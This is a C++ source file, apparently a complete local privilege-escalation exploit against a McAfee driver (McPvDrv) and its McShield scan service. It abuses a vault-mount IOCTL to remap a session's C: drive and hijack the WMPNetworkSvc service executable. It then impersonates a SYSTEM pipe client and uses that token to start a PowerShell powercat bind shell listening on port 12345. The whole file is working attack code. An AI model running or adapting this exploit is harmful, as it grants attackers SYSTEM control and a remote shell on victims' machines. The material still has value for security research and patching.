// FileLockDeviceMapAbuseExploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "McShieldRpcClient.h"
#include "wil/resource.h"
#include "wil/token_helpers.h"
#include "wil/stl.h"
#include "wil/win32_helpers.h"
#include <Windows.h>
#include <sddl.h>
#include <AclAPI.h>
#include <string>
#include <thread>
#include <future>
#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;

constexpr auto NtPathGlobalPrefix = LR"(\\.\Global\)";

#pragma pack(push, 1)
typedef struct _UNLOCK_VAULT_IOCTL_BUFFER
{
    WORD majorCodeOperation;
    DWORD minorCodeOperation;
    DWORD errorCode;
    UCHAR unknown1[4];
    WCHAR driveLetter;
    UCHAR unknown2[28];
    UCHAR decryptKey[32];
    UCHAR unknown3[224];
    DWORD keyLength;
    UCHAR unknown4[772];
    WCHAR devicePostfix[64];
    WCHAR filePath[258];
    WCHAR symbolicLinkPath[192];
} UNLOCK_VAULT_IOCTL_BUFFER, *PUNLOCK_VAULT_IOCTL_BUFFER;

typedef struct _LOCK_VAULT_IOCTL_BUFFER
{
    WORD majorCodeOperation;
    DWORD minorCodeOperation;
    DWORD errorCode;
    UCHAR unknown1[4];
    DWORD driveIndex;
    UCHAR unknown2[2086];
} LOCK_VAULT_IOCTL_BUFFER, *PLOCK_VAULT_IOCTL_BUFFER;
#pragma pack(pop, 1)

void MountDrive(
    std::wstring_view fileDrivePath,
    std::wstring_view ntSymbolicLinkPath,
    wchar_t driveLetter,
    const unsigned char *decryptKey,
    unsigned int decryptKeyLength
)
{
    auto mcPvDrvDevice = wil::unique_hfile(
        ::CreateFile(L"\\\\.\\McPvDrv", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL));
    if (!mcPvDrvDevice)
        throw std::runtime_error("CreateFile failed. Error: " + std::to_string(::GetLastError()));

    constexpr UCHAR unknown2[] = {
        0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x03, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00
    };
    constexpr WCHAR devicePostfix[] = L"6EFFD0C4-AA20-4020-AF79-076F2354";

    UNLOCK_VAULT_IOCTL_BUFFER unlockVaultIoctlBuffer = {};
    unlockVaultIoctlBuffer.majorCodeOperation = 0x200;
    unlockVaultIoctlBuffer.minorCodeOperation = 0x01;
    unlockVaultIoctlBuffer.driveLetter = driveLetter;
    std::memcpy(unlockVaultIoctlBuffer.unknown2, unknown2, sizeof(unknown2));
    unlockVaultIoctlBuffer.keyLength = decryptKeyLength;
    std::memcpy(unlockVaultIoctlBuffer.decryptKey, decryptKey, decryptKeyLength);
    std::memcpy(unlockVaultIoctlBuffer.devicePostfix, devicePostfix, sizeof(devicePostfix));
    std::memcpy(unlockVaultIoctlBuffer.filePath, fileDrivePath.data(), fileDrivePath.size() * sizeof(fileDrivePath[0]));
    std::memcpy(unlockVaultIoctlBuffer.symbolicLinkPath, ntSymbolicLinkPath.data(), ntSymbolicLinkPath.size() * sizeof(ntSymbolicLinkPath[0]));

    DWORD bytesReturned;

    if (!::DeviceIoControl(
        mcPvDrvDevice.get(),
        0x222000,
        &unlockVaultIoctlBuffer, sizeof(unlockVaultIoctlBuffer),
        &unlockVaultIoctlBuffer, sizeof(unlockVaultIoctlBuffer),
        &bytesReturned,
        NULL))
        throw std::runtime_error("DeviceIoControl failed. Error: " + std::to_string(::GetLastError()));

    if (unlockVaultIoctlBuffer.errorCode != 0)
        throw std::runtime_error("Unlock drive failed. Error: " + std::to_string(unlockVaultIoctlBuffer.errorCode));
}

void UnmountDrive(wchar_t driveIndex)
{
    auto mcPvDrvDevice = wil::unique_hfile(
        ::CreateFile(L"\\\\.\\McPvDrv", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL));
    if (!mcPvDrvDevice)
        throw std::runtime_error("CreateFile failed. Error: " + std::to_string(::GetLastError()));

    constexpr UCHAR unknown1[] = {
        0x10, 0x00, 0x00, 0x00
    };

    LOCK_VAULT_IOCTL_BUFFER lockVaultIoctlBuffer = {};
    lockVaultIoctlBuffer.majorCodeOperation = 0x200;
    lockVaultIoctlBuffer.minorCodeOperation = 0x02;
    std::memcpy(lockVaultIoctlBuffer.unknown1, unknown1, sizeof(unknown1));
    lockVaultIoctlBuffer.driveIndex = driveIndex;

    DWORD bytesReturned;

    auto attemptsCount = 0;

    while (true)
    {
        if (!::DeviceIoControl(
            mcPvDrvDevice.get(),
            0x222000,
            &lockVaultIoctlBuffer, sizeof(lockVaultIoctlBuffer),
            &lockVaultIoctlBuffer, sizeof(lockVaultIoctlBuffer),
            &bytesReturned,
            NULL))
            throw std::runtime_error("DeviceIoControl failed. Error: " + std::to_string(::GetLastError()));
        if (lockVaultIoctlBuffer.errorCode != 0xE2010007 || ++attemptsCount >= 5)
            break;

        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    if (lockVaultIoctlBuffer.errorCode != 0)
        throw std::runtime_error("Lock drive failed. Error: " + std::to_string(lockVaultIoctlBuffer.errorCode));
}

constexpr auto ServiceName = L"WMPNetworkSvc";
constexpr auto ServiceExePath = LR"(C:\Program Files\Windows Media Player\wmpnetwk.exe)";

SERVICE_STATUS_HANDLE g_serviceStatusHandle;
SERVICE_STATUS g_serviceStatus;

VOID WINAPI ServiceControlHandler(DWORD dwCtrl)
{
    // Handle the requested control code
    switch (dwCtrl)
    {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_INTERROGATE:
        break;

    default:
        break;
    }
}

VOID ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;

    // Fill in the SERVICE_STATUS structure
    g_serviceStatus.dwCurrentState = dwCurrentState;
    g_serviceStatus.dwWin32ExitCode = dwWin32ExitCode;
    g_serviceStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        g_serviceStatus.dwControlsAccepted = 0;
    else
        g_serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
        g_serviceStatus.dwCheckPoint = 0;
    else
        g_serviceStatus.dwCheckPoint = dwCheckPoint++;

    // Report the status of the service to the SCM
    SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);
}

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
    UNREFERENCED_PARAMETER(dwArgc);

    try
    {
        // Register the handler function for the service
        g_serviceStatusHandle =
            ::RegisterServiceCtrlHandler(lpszArgv[1], ServiceControlHandler);
        if (!g_serviceStatusHandle)
            throw std::runtime_error("RegisterServiceCtrlHandler failed. Error: " + std::to_string(::GetLastError()));

        // These SERVICE_STATUS members remain as set here
        g_serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
        g_serviceStatus.dwServiceSpecificExitCode = 0;

        // Report initial status to the SCM
        ReportServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

        STARTUPINFO si = {};
        si.cb = sizeof(si);

        PROCESS_INFORMATION pi = {};

        std::wstring commandLine = NtPathGlobalPrefix;
        commandLine += lpszArgv[2];

        if (!::CreateProcess(
            nullptr, &commandLine[0], nullptr, nullptr, FALSE, NORMAL_PRIORITY_CLASS, nullptr, nullptr, &si, &pi))
            throw std::runtime_error("CreateProcess failed. Error: " + std::to_string(::GetLastError()));

        ::CloseHandle(pi.hProcess);
        ::CloseHandle(pi.hThread);

        // Report running status when initialization is complete
        ReportServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);

        while (1)
        {
            // Check whether to stop the service
            ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
            return;
        }
    }
    catch (const std::exception &e)
    {
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }
}

#pragma pack(push, 1)
typedef struct _FILE_IO
{
    uint32_t Size;
    uint32_t Unknown_1;
    const wchar_t *Path;
    std::byte Unknown_2[24];
} FILE_IO, *PFILE_IO;

typedef struct _SCAN_OBJECT
{
    uint32_t Size;
    uint32_t Unknown_1;
    uint32_t Unknown_2;
    uint32_t Unknown_3;
    FILE_IO *FileIo;
    std::byte Unknown_4[16];
} SCAN_OBJECT, *PSCAN_OBJECT;
#pragma pack(pop, 1)

namespace
{
    bool DoesTokenContainPrivilege(HANDLE token, LPCTSTR privilegeName)
    {
        auto tokenPrivileges = wil::get_token_information<TOKEN_PRIVILEGES>(token);

        LUID privilegeLuid;
        if (!::LookupPrivilegeValue(nullptr, privilegeName, &privilegeLuid))
            throw std::runtime_error("LookupPrivilegeValue failed. Error: " + std::to_string(::GetLastError()));

        for (const auto &privilege : wil::make_range(tokenPrivileges->Privileges, tokenPrivileges->PrivilegeCount))
        {
            if (privilege.Luid.HighPart == privilegeLuid.HighPart && privilege.Luid.LowPart == privilegeLuid.LowPart)
                return true;
        }

        return false;
    }

    void MakeFileEveryoneRxAccessible(const wchar_t *filePath)
    {
        PACL pOldDacl;
        PSECURITY_DESCRIPTOR pSecurityDescriptor;

        auto returnValue = ::GetNamedSecurityInfo(
            const_cast<LPTSTR>(filePath), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDacl, NULL, &pSecurityDescriptor);
        if (returnValue != ERROR_SUCCESS)
            throw std::runtime_error("GetNamedSecurityInfo failed. Error: " + std::to_string(returnValue));

        auto freeSecurityDescriptorOnExit = wil::scope_exit([pSecurityDescriptor] { ::LocalFree(pSecurityDescriptor); });

        SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
        PSID pSIDEveryone;

        if (!::AllocateAndInitializeSid(
            &SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone))
            throw std::runtime_error("AllocateAndInitializeSid failed. Error: " + std::to_string(::GetLastError()));
        auto freeEveryoneSid = wil::scope_exit([pSIDEveryone] { ::FreeSid(pSIDEveryone); });

        EXPLICIT_ACCESS ea[1];
        ZeroMemory(&ea, sizeof(ea));

        ea[0].grfAccessPermissions = GENERIC_READ | GENERIC_EXECUTE;
        ea[0].grfAccessMode = GRANT_ACCESS;
        ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
        ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
        ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        ea[0].Trustee.ptstrName = reinterpret_cast<LPTSTR>(pSIDEveryone);

        PACL pNewDacl;
        returnValue = ::SetEntriesInAcl(_countof(ea), ea, pOldDacl, &pNewDacl);
        if (returnValue != ERROR_SUCCESS)
            throw std::runtime_error("SetEntriesInAcl failed. Error: " + std::to_string(::GetLastError()));

        auto freeDaclOnExit = wil::scope_exit([pNewDacl] { ::LocalFree(pNewDacl); });

        returnValue = ::SetNamedSecurityInfo(
            const_cast<LPTSTR>(filePath), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
        if (returnValue != ERROR_SUCCESS)
            throw std::runtime_error("SetNamedSecurityInfo failed. Error: " + std::to_string(returnValue));
    }

    void ImpersonatePipeClient(LPCTSTR pipeName, std::promise<void> &&readyPromise)
    {
        SECURITY_DESCRIPTOR securityDescriptor;
        if (!::InitializeSecurityDescriptor(&securityDescriptor, SECURITY_DESCRIPTOR_REVISION))
            throw std::runtime_error("InitializeSecurityDescriptor failed. Error: " + std::to_string(::GetLastError()));

        SECURITY_ATTRIBUTES securityAttributes;
        if (!::ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &securityAttributes.lpSecurityDescriptor, NULL))
            throw std::runtime_error("ConvertStringSecurityDescriptorToSecurityDescriptor failed. Error: " + std::to_string(::GetLastError()));

        auto pipe = wil::unique_hfile(
            ::CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 2048, 2048, 0, &securityAttributes));
        if (!pipe)
            throw std::runtime_error("CreateNamedPipe failed. Error: " + std::to_string(::GetLastError()));

        readyPromise.set_value();

        if (!(::ConnectNamedPipe(pipe.get(), NULL) ? true : (::GetLastError() == ERROR_PIPE_CONNECTED)))
            throw std::runtime_error("ConnectNamedPipe failed. Error: " + std::to_string(::GetLastError()));

        if (!::ImpersonateNamedPipeClient(pipe.get()))
            throw std::runtime_error("ImpersonateNamedPipeClient failed. Error: " + std::to_string(::GetLastError()));

        wil::unique_handle impersonationToken;
        if (!::OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, impersonationToken.put()))
            throw std::runtime_error("OpenThreadToken failed. Error: " + std::to_string(::GetLastError()));

        wil::unique_handle primaryToken;
        if (!::DuplicateTokenEx(impersonationToken.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, &primaryToken))
            throw std::runtime_error("DuplicateTokenEx failed. Error: " + std::to_string(::GetLastError()));

        STARTUPINFO si = {};
        si.wShowWindow = SW_SHOW;
        si.lpDesktop = const_cast<LPWSTR>(L"WinSta0\\Default"); // ToDo: Replace const_cast
        si.cb = sizeof(si);

        PROCESS_INFORMATION pi = {};

        const auto thisModulePathString = wil::GetModuleFileNameW<std::wstring>(NULL);
        const auto thisModulePath = fs::path(thisModulePathString.begin() + std::wcslen(NtPathGlobalPrefix), thisModulePathString.end());
        auto thisModuleParentDirectoryPath = thisModulePath.parent_path();

        std::wstring cmdLineString =
            LR"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe . )" + (thisModuleParentDirectoryPath / L"powercat.ps1").wstring() +
            L";powercat -l -p 12345 -ep";

        if (!::CreateProcessWithTokenW(
            primaryToken.get(), 0, nullptr, &cmdLineString[0], NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi))
            throw std::runtime_error("CreateProcessAsUser failed. Error: " + std::to_string(::GetLastError()));

        ::CloseHandle(pi.hProcess);
        ::CloseHandle(pi.hThread);
    }
} // anonymous namespace

int main()
{
    try
    {
        if (!DoesTokenContainPrivilege(::GetCurrentProcessToken(), SE_IMPERSONATE_NAME))
        {
            const auto mySystemDrivePath = fs::current_path() / L"MySystemDrive.vault";
            constexpr WCHAR symbolicLinkPath[] = LR"(\Sessions\0\DosDevices\00000000-000003e4\X:)";
            constexpr UCHAR decryptKey[] = {
                0xd8, 0x6b, 0xc5, 0x20, 0x0d, 0x81, 0x8a, 0xdf, 0x69, 0x4e, 0x14, 0xf7, 0x32, 0x2e, 0x35, 0xda,
                0xe9, 0xc9, 0xd6, 0x80, 0x86, 0xd0, 0xfd, 0xc9, 0x6b, 0xe9, 0xe5, 0x7e, 0x81, 0xd0, 0x26, 0x1c
            };

            MountDrive(mySystemDrivePath.c_str(), symbolicLinkPath, L'C', decryptKey, sizeof(decryptKey));

            auto scManager = wil::unique_schandle(::OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT));
            if (!scManager)
                throw std::runtime_error("OpenSCManager failed. Error: " + std::to_string(::GetLastError()));

            wil::unique_schandle service = wil::unique_schandle(
                ::OpenService(scManager.get(), ServiceName, SERVICE_START | /*SERVICE_STOP |*/ SERVICE_QUERY_STATUS));
            if (!service)
                throw std::runtime_error("OpenService failed. Error: " + std::to_string(::GetLastError()));

            SERVICE_STATUS_PROCESS serviceStatus;
            DWORD bytesNeeded;

            if (!::QueryServiceStatusEx(
                service.get(), SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&serviceStatus), sizeof(serviceStatus), &bytesNeeded))
                throw std::runtime_error("QueryServiceStatusEx failed. Error: " + std::to_string(::GetLastError()));

            // ToDo: Handle SERVICE_RUNNING and SERVICE_STOP_PENDING

            if (serviceStatus.dwCurrentState != SERVICE_STOPPED)
                throw std::runtime_error("Unexpected service status");

            auto mainModuleFilePath = wil::GetModuleFileNameW<std::wstring>(NULL);
            MakeFileEveryoneRxAccessible(mainModuleFilePath.c_str());

            LPCWSTR serviceArgs[] = { ServiceName, mainModuleFilePath.c_str() };

            if (!::StartService(service.get(), _countof(serviceArgs), serviceArgs))
                throw std::runtime_error("StartService failed. Error: " + std::to_string(::GetLastError()));

            /*
            while (true)
            {
                if (!::QueryServiceStatusEx(
                    service.get(), SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&serviceStatus), sizeof(serviceStatus), &bytesNeeded))
                    throw std::runtime_error("QueryServiceStatusEx failed. Error: " + std::to_string(::GetLastError()));

                if (serviceStatus.dwCurrentState != SERVICE_START_PENDING)
                    break;

                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }

            if (serviceStatus.dwCurrentState != SERVICE_RUNNING)
                throw std::runtime_error("Unexpected service status");
            */
        }
        else
        {
            auto mainModuleFilePath = wil::GetModuleFileNameW<std::wstring>(NULL);

            if (_wcsicmp(mainModuleFilePath.c_str(), ServiceExePath) == 0)
            {
                SERVICE_TABLE_ENTRY DispatchTable[] =
                {
                    { const_cast<LPWSTR>(ServiceName), reinterpret_cast<LPSERVICE_MAIN_FUNCTION>(ServiceMain) },
                    { nullptr, nullptr }
                };

                if (!::StartServiceCtrlDispatcher(DispatchTable))
                    throw std::runtime_error("StartServiceCtrlDispatcher failed. Error: " + std::to_string(::GetLastError()));
            }
            else
            {
                UnmountDrive(0); // ToDo: Remove hardcoded drive index!

                // Create pipe and impersonate client
                std::promise<void> readyPromise;
                auto readyFuture = readyPromise.get_future();

                std::future<void> pipeClientImpersonator = std::async(
                    std::launch::async, ImpersonatePipeClient, LR"(\\.\pipe\ABC)", std::move(readyPromise));

                readyFuture.wait();

                // Scan pipe as SYSTEM
                McShieldRpcClient mcShieldRpcClient;
                mcShieldRpcClient.Scan(LR"(\??\UNC\127.0.0.1\pipe\ABC)");

                pipeClientImpersonator.get();
            }
        }
    }
    catch (const std::exception &e)
    {
        __debugbreak();
        std::cerr << "Exception: " << e.what() << std::endl;
        return -1;
    }

    return 0;
}
